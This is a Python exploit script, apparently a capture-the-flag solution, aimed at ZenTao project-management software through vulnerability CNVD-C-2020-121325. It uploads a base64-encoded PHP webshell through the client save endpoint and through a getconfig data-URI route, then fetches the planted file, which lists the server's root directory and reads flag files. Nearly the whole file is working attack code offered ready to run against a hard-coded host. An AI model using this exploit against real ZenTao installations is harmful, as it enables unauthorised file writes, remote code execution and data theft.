#!/usr/bin/env python3
"""
禅道 CNVD-C-2020-121325 - 最终解决方案
关键点：直接发送 base64 字符串作为 POST body，而不是表单数据
"""

import requests
import base64
import time

def solve_final():
    base_url = "http://47.113.178.182:32829"
    session = requests.Session()

    print("""
╔═══════════════════════════════════════════════════════════════╗
║      禅道 CNVD-C-2020-121325 - 最终解决方案                  ║
╚═══════════════════════════════════════════════════════════════╝
    """)

    # 1. 获取 Session
    print("[*] 获取 Session...")
    session.get(f"{base_url}/zentao/")

    # 2. 准备 Payload：绕过 disable_functions 的扫描脚本
    real_payload = """<?php
error_reporting(0);
echo "---BEGIN---\\n";

// 1. 尝试 scandir
$dir = '/';
$files = scandir($dir);
if($files) {
    echo "Scandir Success:\\n";
    print_r($files);
} else {
    echo "Scandir Failed.\\n";
}

// 2. 尝试读取 flag
echo "\\nReading /flag:\\n";
echo file_get_contents('/flag');
echo "\\nReading /flag.txt:\\n";
echo file_get_contents('/flag.txt');

// 3. 暴力查找
echo "\\nGlob search:\\n";
$glob = glob("/*flag*");
if($glob) {
    print_r($glob);
    foreach($glob as $g) {
        echo "Content of $g: " . file_get_contents($g) . "\\n";
    }
}

echo "\\n---END---";
?>"""

    # Base64 编码
    b64_payload = base64.b64encode(real_payload.encode()).decode()

    print(f"[*] Payload 长度: {len(real_payload)} bytes")
    print(f"[*] Base64 长度: {len(b64_payload)} bytes\n")

    # ===== 方式 A: m=client&f=save (关键：直接发送 base64 字符串) =====
    print("=" * 70)
    print("方式 A: m=client&f=save (直接发送 base64 字符串作为 body)")
    print("=" * 70)

    filename_a = "final_exploit.php"
    target_url_a = f"{base_url}/zentao/index.php?m=client&f=save&t=txt&fileName={filename_a}"

    print(f"[*] 上传 URL: {target_url_a}")
    print(f"[*] 正在上传...")

    try:
        # 关键：直接发送 base64 字符串，不要用字典格式
        res = session.post(target_url_a, data=b64_payload, headers={'Content-Type': 'text/plain'})
        print(f"    上传响应: {res.status_code}")

        time.sleep(0.5)

        # 访问文件
        shell_url = f"{base_url}/zentao/data/client/1/{filename_a}"
        print(f"\n[*] 访问 Shell: {shell_url}")

        res = session.get(shell_url)
        print(f"    响应码: {res.status_code}")
        print(f"    内容长度: {len(res.content)} bytes")

        if len(res.content) > 0:
            print("\n" + "=" * 70)
            print("✓ 成功! Shell 输出:")
            print("=" * 70)
            print(res.text)
            print("=" * 70)

            if "flag{" in res.text.lower() or "ctf{" in res.text.lower():
                print("\n🚩🚩🚩 找到 Flag! 🚩🚩🚩")
                return res.text
        else:
            print("    ✗ 文件内容为空")

    except Exception as e:
        print(f"    ✗ 错误: {e}")

    # ===== 方式 B: mode=getconfig (使用 data URI) =====
    print("\n" + "=" * 70)
    print("方式 B: mode=getconfig (使用 data URI)")
    print("=" * 70)

    data_uri = f"data:text/plain;base64,{b64_payload}"
    filename_b = "final_exploit_b.php"

    print(f"[*] Data URI 长度: {len(data_uri)} bytes")
    print(f"[*] 文件名: {filename_b}")

    params = {
        "mode": "getconfig",
        "fileUrl": data_uri,
        "fileName": filename_b
    }

    endpoints = [
        "/zentao/www/index.php",
        "/zentao/index.php",
    ]

    for endpoint in endpoints:
        url = base_url + endpoint
        print(f"\n[*] 尝试 endpoint: {endpoint}")

        try:
            res = session.get(url, params=params)
            print(f"    响应: {res.status_code}")

            time.sleep(0.5)

            shell_url_b = f"{base_url}/zentao/data/client/1/{filename_b}"
            res = session.get(shell_url_b)
            print(f"    Shell 内容长度: {len(res.content)} bytes")

            if len(res.content) > 0:
                print("\n" + "=" * 70)
                print("✓ 成功! Shell 输出:")
                print("=" * 70)
                print(res.text)
                print("=" * 70)

                if "flag{" in res.text.lower() or "ctf{" in res.text.lower():
                    print("\n🚩🚩🚩 找到 Flag! 🚩🚩🚩")
                    return res.text

        except Exception as e:
            print(f"    ✗ 错误: {e}")

    # ===== 方式 C: 测试纯文本写入 =====
    print("\n" + "=" * 70)
    print("方式 C: 测试纯文本写入 (验证写入功能)")
    print("=" * 70)

    test_content = "HELLO WORLD TEST 12345"
    test_b64 = base64.b64encode(test_content.encode()).decode()
    filename_c = "test_plain.txt"

    url_c = f"{base_url}/zentao/index.php?m=client&f=save&t=txt&fileName={filename_c}"
    print(f"[*] 测试写入纯文本: '{test_content}'")

    try:
        res = session.post(url_c, data=test_b64)
        print(f"    上传: {res.status_code}")

        time.sleep(0.5)

        file_url_c = f"{base_url}/zentao/data/client/1/{filename_c}"
        res = session.get(file_url_c)
        print(f"    文件状态: {res.status_code}, 长度: {len(res.content)}")
        print(f"    文件内容: '{res.text}'")

        if res.text.strip() == test_content:
            print("    ✓ 纯文本写入成功! 说明上传功能正常")
        else:
            print("    ✗ 纯文本写入失败或内容不匹配")

    except Exception as e:
        print(f"    ✗ 错误: {e}")

    return None


if __name__ == "__main__":
    result = solve_final()

    if result:
        print("\n" + "=" * 70)
        print("任务完成! Flag:")
        print("=" * 70)
        print(result)
        print("=" * 70)
    else:
        print("\n[-] 未能获取 Flag")
        print("[*] 可能原因:")
        print("    1. PHP 文件无法执行（被禁用或配置问题）")
        print("    2. 写入内容被过滤或清空")
        print("    3. 需要额外的认证或权限")
